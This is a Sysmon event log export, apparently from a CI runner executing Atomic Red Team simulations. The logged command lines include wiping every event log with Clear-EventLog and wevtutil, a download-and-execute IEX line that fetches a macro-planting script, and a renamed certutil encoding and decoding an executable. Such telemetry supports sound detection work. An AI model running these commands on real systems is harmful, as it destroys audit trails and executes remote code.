"12/17/2025 8:19:56 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:56.820
ProcessGuid: {f995aebf-67ac-6942-eb07-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c del /f %%temp%%\deleteme_T1551.004
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:56 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:56.631
ProcessGuid: {f995aebf-67ac-6942-ea07-000000000e00}
ProcessId: 6248
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:53 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:53.403
ProcessGuid: {f995aebf-67a9-6942-e707-000000000e00}
ProcessId: 1868
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xwcmfher.lsa.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:53 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:53.381
ProcessGuid: {f995aebf-67a9-6942-e707-000000000e00}
ProcessId: 1868
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xwcmfher.lsa.ps1
CreationUtcTime: 2025-12-17 08:19:53.381
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:53 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:53.288
ProcessGuid: {f995aebf-67a9-6942-e707-000000000e00}
ProcessId: 1868
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:52 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:52.992
ProcessGuid: {f995aebf-67a8-6942-e507-000000000e00}
ProcessId: 6728
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2lldqggt.t3f.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:52 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:52.971
ProcessGuid: {f995aebf-67a8-6942-e507-000000000e00}
ProcessId: 6728
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2lldqggt.t3f.ps1
CreationUtcTime: 2025-12-17 08:19:52.971
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:52 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:52.881
ProcessGuid: {f995aebf-67a8-6942-e507-000000000e00}
ProcessId: 6728
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:52 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:52.667
ProcessGuid: {f995aebf-67a8-6942-e307-000000000e00}
ProcessId: 5636
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:52 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:52.518
ProcessGuid: {f995aebf-67a8-6942-e207-000000000e00}
ProcessId: 6096
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:48 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:19:47.212
ProcessGuid: {f995aebf-607e-6942-d602-000000000e00}
ProcessId: 7980
QueryName: 133.108.199.185.in-addr.arpa.
QueryStatus: 0
QueryResults: type: 12 cdn-185-199-108-133.github.com;
Image: C:\Windows\Sysmon64.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:19:47 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:19:45.938
ProcessGuid: {f995aebf-67a1-6942-df07-000000000e00}
ProcessId: 3236
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:47 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:19:45.945
ProcessGuid: {f995aebf-67a1-6942-df07-000000000e00}
ProcessId: 3236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.11
SourceHostname: runnervm8j6r3.nffxvtgvxe4e3eqtaidkon1qmg.bx.internal.cloudapp.net
SourcePort: 55182
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:19:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:45.681
ProcessGuid: {f995aebf-67a1-6942-df07-000000000e00}
ProcessId: 3236
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0qufijxf.40o.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:45 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:45.661
ProcessGuid: {f995aebf-67a1-6942-df07-000000000e00}
ProcessId: 3236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0qufijxf.40o.ps1
CreationUtcTime: 2025-12-17 08:19:45.661
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:45.574
ProcessGuid: {f995aebf-67a1-6942-df07-000000000e00}
ProcessId: 3236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1070.001\src\T1070.001-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ClearLogs\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:45.020
ProcessGuid: {f995aebf-67a0-6942-dd07-000000000e00}
ProcessId: 2452
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w5znoaum.4x4.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:44 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:44.998
ProcessGuid: {f995aebf-67a0-6942-dd07-000000000e00}
ProcessId: 2452
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w5znoaum.4x4.ps1
CreationUtcTime: 2025-12-17 08:19:44.998
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:44.911
ProcessGuid: {f995aebf-67a0-6942-dd07-000000000e00}
ProcessId: 2452
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$logs = Get-EventLog -List | ForEach-Object {$_.Log}
$logs | ForEach-Object {Clear-EventLog -LogName $_ }
Get-EventLog -list}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:44.643
ProcessGuid: {f995aebf-67a0-6942-d807-000000000e00}
ProcessId: 1872
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c wevtutil cl System
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:44.499
ProcessGuid: {f995aebf-67a0-6942-d707-000000000e00}
ProcessId: 8768
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:41.397
ProcessGuid: {f995aebf-679d-6942-d407-000000000e00}
ProcessId: 1268
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c del ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" >nul 2>&1 & del ""%%TEMP%%\art-expand-test.cab"" >nul 2>&1 & rmdir ""%%TEMP%%\art-expand-out"" /s /q >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:41.203
ProcessGuid: {f995aebf-679d-6942-d207-000000000e00}
ProcessId: 8284
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:19:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:41.178
ProcessGuid: {f995aebf-679d-6942-d207-000000000e00}
ProcessId: 8284
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c del %%temp%%\tcm.tmp >nul 2>&1 & del %%temp%%\T1140_calc2.txt >nul 2>&1 & del %%temp%%\T1140_calc2_decoded.exe >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:40 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:40.983
ProcessGuid: {f995aebf-679c-6942-d007-000000000e00}
ProcessId: 7524
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:19:40 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:40.961
ProcessGuid: {f995aebf-679c-6942-d007-000000000e00}
ProcessId: 7524
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c del %%temp%%\T1140_calc.txt >nul 2>&1 & del %%temp%%\T1140_calc_decoded.exe >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:40 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:40.717
ProcessGuid: {f995aebf-679c-6942-cf07-000000000e00}
ProcessId: 836
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:34.486
ProcessGuid: {f995aebf-6796-6942-ca07-000000000e00}
ProcessId: 9760
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c mkdir ""%%TEMP%%\art-expand-out"" >nul 2>&1 & echo hello from atomic red team > ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" & makecab ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" ""%%TEMP%%\art-expand-test.cab"" & pushd ""%%TEMP%%\art-expand-out"" & expand ""%%TEMP%%\art-expand-test.cab"" -F:* . & popd
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:34 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:34.257
ProcessGuid: {f995aebf-6796-6942-c907-000000000e00}
ProcessId: 8884
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
CreationUtcTime: 2025-12-17 08:19:34.257
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:34 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:19:34.227
ProcessGuid: {f995aebf-6796-6942-c907-000000000e00}
ProcessId: 8884
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:34 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:19:34.185
ProcessGuid: {f995aebf-6796-6942-c807-000000000e00}
ProcessId: 4608
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:34.180
ProcessGuid: {f995aebf-6796-6942-c807-000000000e00}
ProcessId: 4608
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp  -encode C:\Windows\System32\calc.exe C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2.txt 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6796-6942-c607-000000000e00}
ParentProcessId: 2460
ParentImage: C:\Windows\System32\cmd.exe
